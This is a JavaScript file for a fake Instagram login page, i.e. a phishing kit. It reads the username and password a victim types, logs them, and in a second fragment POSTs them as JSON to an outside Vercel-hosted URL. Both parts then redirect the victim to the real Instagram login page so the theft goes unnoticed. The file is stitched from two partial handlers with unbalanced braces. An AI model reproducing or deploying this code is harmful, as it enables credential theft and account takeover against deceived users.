document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Log the credentials to the console
    console.log('Username:', username);
    console.log('Password:', password);

    // Optionally, you can redirect the user to the real Instagram login page
    window.location.href = 'https://www.instagram.com/accounts/login/';
});


    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Send the credentials to your server
    fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username: username, password: password }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Optionally, you can redirect the user to the real Instagram login page
        window.location.href = 'https://www.instagram.com/accounts/login/';
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});
